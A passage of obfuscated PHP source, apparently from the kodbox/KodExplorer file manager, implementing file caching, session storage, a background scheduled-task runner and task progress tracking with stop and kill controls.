$§ÏİŒ†´[$ö¦¶œÅç][$Ã’ÙöšÓ[332]] <= $éıœè÷Ì; } $Â©êóË€ = self::get($ö¦¶œÅç); if (!is_array($Â©êóË€) || time() - $Â©êóË€[$Ã’ÙöšÓ[204]] > $œóÕØŸï) { $Â©êóË€ = array($Ã’ÙöšÓ[204] => time(), $Ã’ÙöšÓ[332] => 0); } $Â©êóË€[$Ã’ÙöšÓ[332]]++; self::set($ö¦¶œÅç, $Â©êóË€, $œóÕØŸï); $§ÏİŒ†´[$ö¦¶œÅç] = $Â©êóË€; return $Â©êóË€[$Ã’ÙöšÓ[332]] <= $éıœè÷Ì; } public static function limitRuntime($¤û²¹ê‰, $“Ôš°ŞÆ) { $Ê¼‘ª‚Ä = $_SERVER[ïÃ°£«Ê][989] . $¤û²¹ê‰; if (isset(self::$runTimeCache[$Ê¼‘ª‚Ä]) || !$“Ôš°ŞÆ) { return !0; } $ñ‘ŠÎò = intval(self::get($Ê¼‘ª‚Ä)); $ñ‘ŠÎò = !$ñ‘ŠÎò || $ñ‘ŠÎò <= 0 ? 1 : $ñ‘ŠÎò + 1; if ($ñ‘ŠÎò > $“Ôš°ŞÆ) { return !1; } self::$runTimeCache[$Ê¼‘ª‚Ä] = !0; self::set($Ê¼‘ª‚Ä, $ñ‘ŠÎò, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $Êô¯¸û™ => $‚ó±‚Ã) { $äòÒÍÅÎ = intval(self::get($Êô¯¸û™)); $äòÒÍÅÎ = !$äòÒÍÅÎ || $äòÒÍÅÎ <= 1 ? 0 : $äòÒÍÅÎ - 1; self::set($Êô¯¸û™, $äòÒÍÅÎ, 3600); } self::$runTimeCache = array(); } public static function remove($Ä³ÏêÚ¶) { $¡ãƒ£—‡ = self::key($Ä³ÏêÚ¶); unset(self::$memoryCache[$¡ãƒ£—‡]); self::clearTimeout(); CacheLock::lock($Ä³ÏêÚ¶); $¥¯š®Òü = self::init()->remove($¡ãƒ£—‡); CacheLock::unlock($Ä³ÏêÚ¶); return $¥¯š®Òü; } public static function removeMemory($š®§˜Àµ) { $¼»ôôœÁ = self::key($š®§˜Àµ); unset(self::$memoryCache[$¼»ôôœÁ]); } public static function clearMemory($÷Ãş† Ã = false) { if ($÷Ãş† Ã) { $÷Ãş† Ã = self::key($÷Ãş† Ã); unset(self::$memoryCache[$÷Ãş† Ã]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ïÃ°£«Ê][990])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ïÃ°£«Ê][991])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($®ü¾¥×Ó, $ÊğÔßÜ©) { $Æ¬ôî‰› =& $_SERVER[ïÃ°£«Ê]; $this->cachePath = $®ü¾¥×Ó[$Æ¬ôî‰›[87]]; $this->prefix = $Æ¬ôî‰›[992]; $this->cacheTime = $ÊğÔßÜ©; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¥ıû¤ÑÒ) { $¡²´İÜœ =& $_SERVER[ïÃ°£«Ê]; $¥ıû¤ÑÒ = str_replace(array($¡²´İÜœ[993], $¡²´İÜœ[97], $¡²´İÜœ[76]), $¡²´İÜœ[994], $¥ıû¤ÑÒ); return $this->cachePath . $¡²´İÜœ[995] . $¥ıû¤ÑÒ . $¡²´İÜœ[996]; } public function set($ªÂ‹Áè, $†¸¥Ï, $ƒü©Ú‰ = false) { $ƒü©Ú‰ = $ƒü©Ú‰ ? $ƒü©Ú‰ : $this->cacheTime; $Ç¹Ç¡¾ = $this->getFile($ªÂ‹Áè); if (file_put_contents($Ç¹Ç¡¾, $this->prefix . $†¸¥Ï, LOCK_EX)) { @touch($Ç¹Ç¡¾, intval(time() + $ƒü©Ú‰)); clearstatcache(); return !0; } @unlink($Ç¹Ç¡¾); return !1; } public function get($¼ßçÎª½) { $ËØ½Â” = $this->getFile($¼ßçÎª½); if (file_exists($ËØ½Â”) && filemtime($ËØ½Â”) < time()) { @unlink($ËØ½Â”); return !1; } $şíûÊôÆ = @file_get_contents($ËØ½Â”); return substr($şíûÊôÆ, strlen($this->prefix)); } public function remove($ÄµÔŠæÏ) { $£öãÂğá = $this->getFile($ÄµÔŠæÏ); return @unlink($£öãÂğá); } public function deleteAll() { $Ì¿Ğï› =& $_SERVER[ïÃ°£«Ê]; $âÚê©®® = scandir($this->cachePath); foreach ($âÚê©®® as $Ù”¿ÌèÔ) { $³ ÈúêÅ = $this->cachePath . $Ù”¿ÌèÔ; if (strpos($³ ÈúêÅ, $Ì¿Ğï›[996]) && strpos($³ ÈúêÅ, $Ì¿Ğï›[997])) { @unlink($³ ÈúêÅ); } } } public function clearTimeout() { $âì°¿•È =& $_SERVER[ïÃ°£«Ê]; $ÆõĞşòĞ = scandir($this->cachePath); foreach ($ÆõĞşòĞ as $¥£ØÇè) { $àÜê”‚ê = $this->cachePath . $¥£ØÇè; if (strpos($àÜê”‚ê, $âì°¿•È[996]) && strpos($àÜê”‚ê, $âì°¿•È[997]) && filemtime($àÜê”‚ê) < time()) { @unlink($àÜê”‚ê); } } } } goto cİŒª½ƒáÁ; eˆŒÏ‡«È†: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¹Õé àŸ =& $_SERVER[ïÃ°£«Ê]; static $î‹ÄÃ­ = false; if ($î‹ÄÃ­) { return $î‹ÄÃ­; } $ÖÜº¿ç¯ = $GLOBALS[$¹Õé àŸ[6]][$¹Õé àŸ[424]]; self::$sessionTime = $ÖÜº¿ç¯[$¹Õé àŸ[1927]]; $»ğÀŞ»à = isset($GLOBALS[$¹Õé àŸ[1928]]) ? $GLOBALS[$¹Õé àŸ[1928]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($»ğÀŞ»à)) { self::$sessionSign = Cookie::get($»ğÀŞ»à); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($»ğÀŞ»à, self::$sessionSign, self::$sessionTime); $‹«ÔÈ¸ù = $ÖÜº¿ç¯[$¹Õé àŸ[1929]]; $Œ³Éá = $ÖÜº¿ç¯[$‹«ÔÈ¸ù]; $ˆÅÎõ¬× = $ÖÜº¿ç¯[$¹Õé àŸ[982]]; switch ($‹«ÔÈ¸ù) { case $¹Õé àŸ[21]: self::$handle = Model($¹Õé àŸ[983]); break; case $¹Õé àŸ[984]: self::$handle = new CacheRedis($Œ³Éá, $ˆÅÎõ¬×); break; case $¹Õé àŸ[985]: self::$handle = new CacheMemcached($Œ³Éá, $ˆÅÎõ¬×); break; case $¹Õé àŸ[230]: $Œ³Éá[$¹Õé àŸ[87]] = $Œ³Éá[$¹Õé àŸ[87]] . $¹Õé àŸ[1930]; self::$handle = new CacheFile($Œ³Éá, $ˆÅÎõ¬×); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$¹Õé àŸ[1664]]) || time() - self::$data[$¹Õé àŸ[1664]] >= 5) { self::dataSave(); } } $î‹ÄÃ­ = new self(); return $î‹ÄÃ­; } public static function getBySign($™Š¡í¼‹) { $•¹†•Ğâ = self::$handle->get($™Š¡í¼‹); $•¹†•Ğâ = unserialize($•¹†•Ğâ); return is_array($•¹†•Ğâ) ? $•¹†•Ğâ : array(); } public static function setBySign($–»°ÒÊÑ, $©íˆ§ÔÓ) { self::$sessionSign = $–»°ÒÊÑ; self::$data = $©íˆ§ÔÓ; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[ïÃ°£«Ê][1664]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($ª‰«Ğ¿¤ = false) { if ($ª‰«Ğ¿¤) { self::$sessionSign = $ª‰«Ğ¿¤; } self::init(); return self::$sessionSign; } public static function set($åÌø”•², $Ìºù³Û = false) { self::init(); if (is_array($åÌø”•²)) { foreach ($åÌø”•² as $ò†Ÿ¼µÃ => $©œŠ›) { array_set_value(self::$data, $ò†Ÿ¼µÃ, $©œŠ›); } } else { array_set_value(self::$data, $åÌø”•², $Ìºù³Û); } self::dataSave(); } public static function get($æ¡½¹Œ© = false) { self::init(); if (!$æ¡½¹Œ©) { return self::$data; } return array_get_value(self::$data, $æ¡½¹Œ©); } public static function remove($â»šáìê) { self::init(); unset(self::$data[$â»šáìê]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ïÃ°£«Ê][991])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ßñŠ¾…â =& $_SERVER[ïÃ°£«Ê]; if (self::valueGet($ßñŠ¾…â[851]) != $ßñŠ¾…â[91]) { return; } if (self::valueGet($ßñŠ¾…â[940]) == $ßñŠ¾…â[91]) { $ÌÌø÷õé = self::valueGet($ßñŠ¾…â[1931]); if (time() - $ÌÌø÷õé > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ßñŠ¾…â[940], $ßñŠ¾…â[91]); self::log($ßñŠ¾…â[1932] . ACTION . $ßñŠ¾…â[1933]); Hook::bind($ßñŠ¾…â[1934], $ßñŠ¾…â[1935]); $ğîÉÃÚ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ßñŠ¾…â[851]) != $ßñŠ¾…â[91]) { self::valueSet($ßñŠ¾…â[940], $ßñŠ¾…â[228]); self::log($ßñŠ¾…â[1936]); die; } $‰éüËòÀ = time(); if ($‰éüËòÀ - $ğîÉÃÚ >= 60) { self::valueSet(array($ßñŠ¾…â[940] => $ßñŠ¾…â[91], $ßñŠ¾…â[1931] => $‰éüËòÀ)); $ğîÉÃÚ = $‰éüËòÀ; } if (!file_exists(USER_SYSTEM . $ßñŠ¾…â[1937])) { self::valueSet(array($ßñŠ¾…â[940] => $ßñŠ¾…â[228], $ßñŠ¾…â[851] => $ßñŠ¾…â[228])); self::log($ßñŠ¾…â[1938]); die; } $ÖÏ¾‡ÉÕ = file_get_contents(BASIC_PATH . $ßñŠ¾…â[1939]); $±ï¿¼ğ¾ = KOD_VERSION . $ßñŠ¾…â[10] . KOD_VERSION_BUILD; $Ç×Õ©—¾ = match_text($ÖÏ¾‡ÉÕ, $ßñŠ¾…â[1940]) . $ßñŠ¾…â[10] . match_text($ÖÏ¾‡ÉÕ, $ßñŠ¾…â[1941]); if ($Ç×Õ©—¾ != $±ï¿¼ğ¾) { self::restart(); self::log("\x73\x74\x6f\160\x65\x64\x2e\133\x76\x65\x72\163\x69\157\156\x20\165\x70\x64\141\x74\145\73{$versionNow}\40\75\x3e\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $¯Æ”ıÀ¨ =& $_SERVER[ïÃ°£«Ê]; http_close(); $GLOBALS[$¯Æ”ıÀ¨[1942]] = 1; $_SERVER[$¯Æ”ıÀ¨[1943]] = $¯Æ”ıÀ¨[1944]; $_COOKIE = array(); $GLOBALS[$¯Æ”ıÀ¨[1945]] = 1; $GLOBALS[$¯Æ”ıÀ¨[1946]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Øõ¬¢×ı =& $_SERVER[ïÃ°£«Ê]; http_close(); self::valueSet($Øõ¬¢×ı[851], $Øõ¬¢×ı[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Øõ¬¢×ı[940] => $Øõ¬¢×ı[228], $Øõ¬¢×ı[851] => $Øõ¬¢×ı[91])); self::log($Øõ¬¢×ı[1947]); } public static function taskSwitch() { $ë‹ÜÓºÑ =& $_SERVER[ïÃ°£«Ê]; $­¸ˆû•ò = self::valueGet($ë‹ÜÓºÑ[851]) == $ë‹ÜÓºÑ[91] ? $ë‹ÜÓºÑ[228] : $ë‹ÜÓºÑ[91]; self::valueSet($ë‹ÜÓºÑ[851], $­¸ˆû•ò); } public static function shutdownEvent() { $Ñ©ıûß¹ =& $_SERVER[ïÃ°£«Ê]; self::valueSet($Ñ©ıûß¹[940], $Ñ©ıûß¹[228]); self::log($Ñ©ıûß¹[1948]); } public static function config($º§€Õ, $ŞŸÙß®) { self::valueSet($_SERVER[ïÃ°£«Ê][851], $º§€Õ); } private static function taskRunAll() { $ïÄæßà‚ =& $_SERVER[ïÃ°£«Ê]; $úŠú×¯ = timeFloat(); $’üÆ¢ãˆ = Model($ïÄæßà‚[1949])->listData(); $Ã•Šã = count($’üÆ¢ãˆ); for ($¢Ë»¶É± = 0; $¢Ë»¶É± < $Ã•Šã; $¢Ë»¶É±++) { $Îåõ„ª = $’üÆ¢ãˆ[$¢Ë»¶É±]; if (!$Îåõ„ª[$ïÄæßà‚[487]] || $Îåõ„ª[$ïÄæßà‚[1950]] != $ïÄæßà‚[91]) { continue; } if (!self::taskTimeCheck($Îåõ„ª)) { continue; } self::taskRun($Îåõ„ª); } Hook::trigger($ïÄæßà‚[1951]); self::taskQueueRun($úŠú×¯); } private static function taskQueueRun($¨¯ßØ˜Ê) { $°İ™íë› = 10; while (!0) { $Ÿ´÷ÜÕù = TaskQueue::run(); if ($Ÿ´÷ÜÕù === !1) { break; } if (timeFloat() - $¨¯ßØ˜Ê >= $°İ™íë›) { break; } } } private static function taskTimeCheck($¾†à§ûç) { $çÈˆ³ó =& $_SERVER[ïÃ°£«Ê]; $ÌğßÂ…È = json_decode($¾†à§ûç[$çÈˆ³ó[204]], !0); $ñáòßãê = intval($¾†à§ûç[$çÈˆ³ó[1931]]); $ªë›™õ· = strtotime($çÈˆ³ó[1952] . $ÌğßÂ…È[$çÈˆ³ó[1953]] . $çÈˆ³ó[1954]) - strtotime($çÈˆ³ó[1955]); $³€ûòš = time() - strtotime(date($çÈˆ³ó[1956]) . $çÈˆ³ó[1957]); $àŸÂ¨È¹ = $³€ûòš >= $ªë›™õ· && $³€ûòš <= $ªë›™õ· + 3600; switch ($ÌğßÂ…È[$çÈˆ³ó[33]]) { case $çÈˆ³ó[1958]: if (time() - $ñáòßãê < 3600 * 24 * 30) { return !1; } if ($ÌğßÂ…È[$çÈˆ³ó[1958]] == date($çÈˆ³ó[1959]) && $àŸÂ¨È¹) { return !0; } break; case $çÈˆ³ó[1960]: if (time() - $ñáòßãê < 3600 * 24 * 7) { return !1; } $ŒƒÒ­©å = date($çÈˆ³ó[1961]) == 0 ? 7 : date($çÈˆ³ó[1961]); if ($ÌğßÂ…È[$çÈˆ³ó[1960]] == $ŒƒÒ­©å && $àŸÂ¨È¹) { return !0; } break; case $çÈˆ³ó[1953]: if (time() - $ñáòßãê < 3600 * 24) { return !1; } if ($àŸÂ¨È¹) { return !0; } break; case $çÈˆ³ó[1962]: if (time() - $ñáòßãê >= floatval($ÌğßÂ…È[$çÈˆ³ó[1962]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Ó—å³·º =& $_SERVER[ïÃ°£«Ê]; static $Üá¯’Ò = 0; $ØœôÁÉ‹ = 300; if (!$Üá¯’Ò) { $Üá¯’Ò = time(); } if (time() - $Üá¯’Ò < $ØœôÁÉ‹) { return; } $Üá¯’Ò = time(); $çÙøæõ = Model($Ó—å³·º[597])->db($Ó—å³·º[12]); if ($çÙøæõ) { $çÙøæõ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Ó—å³·º[1963], $Ó—å³·º[1964]); die; } } public static function taskRun($‘ğà»„§) { $­ëÕßı¼ =& $_SERVER[ïÃ°£«Ê]; self::log($­ëÕßı¼[1965] . $‘ğà»„§[$­ëÕßı¼[487]] . $­ëÕßı¼[1966] . $‘ğà»„§[$­ëÕßı¼[32]] . $­ëÕßı¼[1967] . $‘ğà»„§[$­ëÕßı¼[1565]]); Model($­ëÕßı¼[1949])->run($‘ğà»„§[$­ëÕßı¼[487]]); $’Òœ¨ƒ‹ = timeFloat(); $îŸë’Ÿ˜ = $­ëÕßı¼[12]; switch ($‘ğà»„§[$­ëÕßı¼[33]]) { case $­ëÕßı¼[382]: $Å®€ÃîÒ = url_request($‘ğà»„§[$­ëÕßı¼[1565]], $­ëÕßı¼[1607], !1, !1, !1, !1, 10); if ($Å®€ÃîÒ[$­ëÕßı¼[851]]) { $îŸë’Ÿ˜ = strlen($Å®€ÃîÒ[$­ëÕßı¼[1394]]); } break; case $­ëÕßı¼[1968]: $îŸë’Ÿ˜ = Hook::apply($‘ğà»„§[$­ëÕßı¼[1565]]); default: break; } Model($­ëÕßı¼[1969])->add(array($­ëÕßı¼[1970] => $­ëÕßı¼[12], $­ëÕßı¼[1971] => $­ëÕßı¼[228], $­ëÕßı¼[33] => $­ëÕßı¼[1972] . $‘ğà»„§[$­ëÕßı¼[487]], $­ëÕßı¼[1973] => json_encode(array($­ëÕßı¼[32] => $‘ğà»„§[$­ëÕßı¼[32]], $­ëÕßı¼[1974] => timeFloat() - $’Òœ¨ƒ‹, $­ëÕßı¼[857] => $îŸë’Ÿ˜)))); $üüÍ¡»Ö = $îŸë’Ÿ˜ ? $­ëÕßı¼[1975] . $îŸë’Ÿ˜ : $­ëÕßı¼[12]; self::log($­ëÕßı¼[1976] . $‘ğà»„§[$­ëÕßı¼[487]] . $­ëÕßı¼[175] . $üüÍ¡»Ö); return !0; } public static function valueGet($ˆ…––‹ù) { $‘ŠĞæñ‡ =& $_SERVER[ïÃ°£«Ê]; $ÈŠ½²Şå = $‘ŠĞæñ‡[1977]; $Ñ¡Õˆ…â = Model($‘ŠĞæñ‡[522])->get($ˆ…––‹ù, $ÈŠ½²Şå); if (is_null($Ñ¡Õˆ…â)) { Model($‘ŠĞæñ‡[522])->set($‘ŠĞæñ‡[851], $‘ŠĞæñ‡[91], $ÈŠ½²Şå); Model($‘ŠĞæñ‡[522])->set($‘ŠĞæñ‡[940], $‘ŠĞæñ‡[228], $ÈŠ½²Şå); $Ñ¡Õˆ…â = Model($‘ŠĞæñ‡[522])->get($ˆ…––‹ù, $ÈŠ½²Şå); } return $Ñ¡Õˆ…â; } private static function valueSet($¹ÕöıÌ¶, $Ö¤ø‚¹ = false) { $ñ‡Ê“¢ =& $_SERVER[ïÃ°£«Ê]; $êŠÔ­€˜ = $ñ‡Ê“¢[1978]; CacheLock::lock($êŠÔ­€˜); $á·å¶– = Model($ñ‡Ê“¢[522])->set($¹ÕöıÌ¶, $Ö¤ø‚¹, $ñ‡Ê“¢[1977]); CacheLock::unlock($êŠÔ­€˜); return $á·å¶–; } protected static function log($÷İùµ…Û) { write_log($÷İùµ…Û, $_SERVER[ïÃ°£«Ê][1964]); } private static function cacheClear() { $ë‚¯ÅÕ¼ =& $_SERVER[ïÃ°£«Ê]; Cache::clearMemory(Model($ë‚¯ÅÕ¼[522])->cacheKey($ë‚¯ÅÕ¼[1977])); Cache::clearMemory(Model($ë‚¯ÅÕ¼[522])->cacheKey($ë‚¯ÅÕ¼[1979])); Model($ë‚¯ÅÕ¼[1949])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\x6f\160"; const STATYS_RUNNING = "\162\x75\156\x6e\151\156\x67"; const STATYS_KILL = "\153\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ö¿ğ¼·, $œ¯…”Ùâ = '', $ˆÌÖ¤ËŸ = 0, $¤Í—²”Æ = '') { $š¸­Ğ—Á =& $_SERVER[ïÃ°£«Ê]; if (self::get($ö¿ğ¼·)) { return; } $this->task = array($š¸­Ğ—Á[487] => $ö¿ğ¼·, $š¸­Ğ—Á[1594] => USER_ID, $š¸­Ğ—Á[1869] => $¤Í—²”Æ, $š¸­Ğ—Á[540] => $š¸­Ğ—Á[12], $š¸­Ğ—Á[33] => $œ¯…”Ùâ, $š¸­Ğ—Á[1236] => $š¸­Ğ—Á[12], $š¸­Ğ—Á[1234] => $ˆÌÖ¤ËŸ, $š¸­Ğ—Á[1980] => 0, $š¸­Ğ—Á[1981] => 0, $š¸­Ğ—Á[1982] => 0, $š¸­Ğ—Á[1983] => timeFloat(), $š¸­Ğ—Á[1984] => 0, $š¸­Ğ—Á[1985] => 0, $š¸­Ğ—Á[1986] => 0, $š¸­Ğ—Á[1987] => 0, $š¸­Ğ—Á[851] => $š¸­Ğ—Á[940]); $GLOBALS[$š¸­Ğ—Á[1988]] = 1; Hook::bind($š¸­Ğ—Á[1934], array($this, $š¸­Ğ—Á[1989])); Hook::bind($š¸­Ğ—Á[1990], array($this, $š¸­Ğ—Á[1991])); $this->startAfter(); Hook::trigger($š¸­Ğ—Á[1992], $this->task); $this->task[$š¸­Ğ—Á[1985]] = timeFloat(); } public function end($ƒ¯¬ÊÃØ = '') { $â­”Ñ–³ =& $_SERVER[ïÃ°£«Ê]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$â­”Ñ–³[1985]]) { self::valueSet($this->task[$â­”Ñ–³[487]], !1); } $this->isEnd = !0; if ($ƒ¯¬ÊÃØ) { $this->task[$â­”Ñ–³[540]] = $ƒ¯¬ÊÃØ; } self::log($â­”Ñ–³[1993] . $this->task[$â­”Ñ–³[487]] . $â­”Ñ–³[1994] . sprintf($â­”Ñ–³[1009], timeFloat() - $this->task[$â­”Ñ–³[1983]]) . $â­”Ñ–³[1995]); Hook::unbind($â­”Ñ–³[1934], array($this, $â­”Ñ–³[1989])); Hook::unbind($â­”Ñ–³[1990], array($this, $â­”Ñ–³[1991])); $this->endAfter(); $…¨²Ò™÷ = $this->task; $this->task = !1; Hook::trigger($â­”Ñ–³[1996], $…¨²Ò™÷); } public function update($ŠµúÉßØ = 0, $˜šÛ£Ù­ = false) { $ƒƒÁö©á =& $_SERVER[ïÃ°£«Ê]; $ÓÂŠÓ‡ =& $this->task; if (!$ÓÂŠÓ‡) { return; } $ÓÂŠÓ‡[$ƒƒÁö©á[1980]] += $ŠµúÉßØ; $ÓÂŠÓ‡[$ƒƒÁö©á[1984]] = timeFloat(); if ($ÓÂŠÓ‡[$ƒƒÁö©á[1234]]) { if ($ÓÂŠÓ‡[$ƒƒÁö©á[1234]] < $ÓÂŠÓ‡[$ƒƒÁö©á[1980]]) { $ÓÂŠÓ‡[$ƒƒÁö©á[1234]] = $ÓÂŠÓ‡[$ƒƒÁö©á[1980]]; } $ĞíÍŞšÕ = timeFloat() - $ÓÂŠÓ‡[$ƒƒÁö©á[1983]] - $ÓÂŠÓ‡[$ƒƒÁö©á[1986]]; if ($ĞíÍŞšÕ <= 0) { $ĞíÍŞšÕ = 0.001; } $ÓÂŠÓ‡[$ƒƒÁö©á[1981]] = $ÓÂŠÓ‡[$ƒƒÁö©á[1980]] / $ÓÂŠÓ‡[$ƒƒÁö©á[1234]]; $ÓÂŠÓ‡[$ƒƒÁö©á[1982]] = $ÓÂŠÓ‡[$ƒƒÁö©á[1980]] / $ĞíÍŞšÕ; if ($ÓÂŠÓ‡[$ƒƒÁö©á[1981]] > 0) { $ÓÂŠÓ‡[$ƒƒÁö©á[1987]] = $ĞíÍŞšÕ * (1 - $ÓÂŠÓ‡[$ƒƒÁö©á[1981]]) / $ÓÂŠÓ‡[$ƒƒÁö©á[1981]]; } $ÓÂŠÓ‡[$ƒƒÁö©á[1987]] = $ÓÂŠÓ‡[$ƒƒÁö©á[1987]] <= 0 ? 0 : $ÓÂŠÓ‡[$ƒƒÁö©á[1987]]; } $this->updateAfter(); $ Ø«’ÖÏ = 0.2; if (timeFloat() - $ÓÂŠÓ‡[$ƒƒÁö©á[1985]] < $ Ø«’ÖÏ && !$˜šÛ£Ù­) { return; } $Ëòà‰É = self::get($ÓÂŠÓ‡[$ƒƒÁö©á[487]]); $—°Œîª³ = $Ëòà‰É[$ƒƒÁö©á[851]]; if ($—°Œîª³ == self::STATYS_KILL) { $¸Ï‰ÖŠ = array($ƒƒÁö©á[1997] => LNG($ƒƒÁö©á[1998]), $ƒƒÁö©á[1404] => !1); Cache::set($ƒƒÁö©á[1999] . $this->task[$ƒƒÁö©á[487]], $¸Ï‰ÖŠ, 30); $this->onKill(); $this->end(); die; } else { if ($—°Œîª³ == self::STATYS_STOP) { $®îü†¸Š = 2; $Ëòà‰É[$ƒƒÁö©á[1986]] += $®îü†¸Š; self::valueSet($ÓÂŠÓ‡[$ƒƒÁö©á[487]], $Ëòà‰É); sleep($®îü†¸Š); $this->update(); return; } } $ÓÂŠÓ‡[$ƒƒÁö©á[851]] = $—°Œîª³ ? $—°Œîª³ : $ÓÂŠÓ‡[$ƒƒÁö©á[851]]; $ÓÂŠÓ‡[$ƒƒÁö©á[1986]] = $Ëòà‰É[$ƒƒÁö©á[1986]] ? $Ëòà‰É[$ƒƒÁö©á[1986]] : 0; $ÓÂŠÓ‡[$ƒƒÁö©á[1985]] = timeFloat(); Hook::trigger($ƒƒÁö©á[2000], $ÓÂŠÓ‡); self::valueSet($ÓÂŠÓ‡[$ƒƒÁö©á[487]], $ÓÂŠÓ‡); } public function onKillSet($Òµ¨ºÙ, $á€Í¬†Ì = array()) { $this->onKillCall = array($Òµ¨ºÙ, $á€Í¬†Ì); } public function onKill() { $·ËÃŠ¿Ë =& $_SERVER[ïÃ°£«Ê]; self::log($·ËÃŠ¿Ë[1993] . $this->task[$·ËÃŠ¿Ë[487]] . $·ËÃŠ¿Ë[2001]); Hook::trigger($·ËÃŠ¿Ë[2002], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¥ÅÈ«ú®) { $ïÛ®‰Íó =& $_SERVER[ïÃ°£«Ê]; Cache::set($ïÛ®‰Íó[1999] . $this->task[$ïÛ®‰Íó[487]], $¥ÅÈ«ú®, 60); if (!is_array($¥ÅÈ«ú®) || !$¥ÅÈ«ú®[$ïÛ®‰Íó[1404]]) { self::log($ïÛ®‰Íó[2003] . json_encode($¥ÅÈ«ú®)); } return $¥ÅÈ«ú®; } public static function get($ÌÄÒ¼ãò) { $¸££ÍÉÂ =& $_SERVER[ïÃ°£«Ê]; $åÈ¥ÄĞ´ = self::valueGet($ÌÄÒ¼ãò); if (is_array($åÈ¥ÄĞ´) && $åÈ¥ÄĞ´[$¸££ÍÉÂ[2004]]) { $›Ãï¸™˜ = ActionApply($åÈ¥ÄĞ´[$¸££ÍÉÂ[2004]], array($åÈ¥ÄĞ´)); $åÈ¥ÄĞ´ = is_array($›Ãï¸™˜) ? $›Ãï¸™˜ : $åÈ¥ÄĞ´; } return $åÈ¥ÄĞ´; } public static function listData() { $Ğ§è¼‰Õ = self::valueGet(); return array_sort_by($Ğ§è¼‰Õ, $_SERVER[ïÃ°£«Ê][1983], !0); } public static function kill($±¬Äø¼Ü) { return self::changeStatus($±¬Äø¼Ü, self::STATYS_KILL); } public static function stop($”Ô¨€ò) { return self::changeStatus($”Ô¨€ò, self::STATYS_STOP); } public static function restart($úñÔ‰ß) { return self::changeStatus($úñÔ‰ß, self::STATYS_RUNNING); } public static function killAll() { $­ØÈèƒÆ =& $_SERVER[ïÃ°£«Ê]; $ûÚİÕï = self::listData(); foreach ($ûÚİÕï as $úß“âòÀ) { self::kill($úß“âòÀ[$­ØÈèƒÆ[487]]); } sleep(2); foreach ($ûÚİÕï as $úß“âòÀ) { self::valueSet($úß“âòÀ[$­ØÈèƒÆ[487]], !1); } } private static function changeStatus($ãıöÌı‚, $œù‡º¤) { $Éİ×¶†ö =& $_SERVER[ïÃ°£«Ê]; $™ô§æ„ = self::valueGet($ãıöÌı‚); if (!$™ô§æ„) { return !1; } $™ô§æ„[$Éİ×¶†ö[851]] = $œù‡º¤; self::valueSet($ãıöÌı‚, $™ô§æ„); self::log($Éİ×¶†ö[2005] . $™ô§æ„[$Éİ×¶†ö[487]] . $Éİ×¶†ö[2006] . $œù‡º¤); return !0; } public static function valueGet($ä‰Ë§ó  = false) { $ÚÑãÔ˜´ =& $_SERVER[ïÃ°£«Ê]; if ($ä‰Ë§ó ) { $—Ãº»İ = Model($ÚÑãÔ˜´[534])->where(array($ÚÑãÔ˜´[95] => $ä‰Ë§ó , $ÚÑãÔ˜´[33] => $ÚÑãÔ˜´[1243]))->find(); return $—Ãº»İ ? json_decode($—Ãº»İ[$ÚÑãÔ˜´[451]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($«¤èéÆŸ = false) { $şÅŸÓÛ =& $_SERVER[ïÃ°£«Ê]; $ˆñéŸ’ = array($şÅŸÓÛ[33] => $şÅŸÓÛ[1243]); if ($«¤èéÆŸ) { $ˆñéŸ’[$şÅŸÓÛ[1594]] = $«¤èéÆŸ; } $ğÈ·Ä‹Å = Model($şÅŸÓÛ[534])->where($ˆñéŸ’)->select(); $ğÈ·Ä‹Å = $ğÈ·Ä‹Å ? $ğÈ·Ä‹Å : array(); foreach ($ğÈ·Ä‹Å as $ ìÅ­ğ => $À…·¾¤) { $ğÈ·Ä‹Å[$ ìÅ­ğ] = json_decode($À…·¾¤[$şÅŸÓÛ[451]], !0); } return $ğÈ·Ä‹Å; } public static function valueSet($½øú€ñå, $æéß¤¼) { $Áä‘ˆ¯Ú =& $_SERVER[ïÃ°£«Ê]; if (!$æéß¤¼) { return Model($Áä‘ˆ¯Ú[534])->where(array($Áä‘ˆ¯Ú[95] => $½øú€ñå, 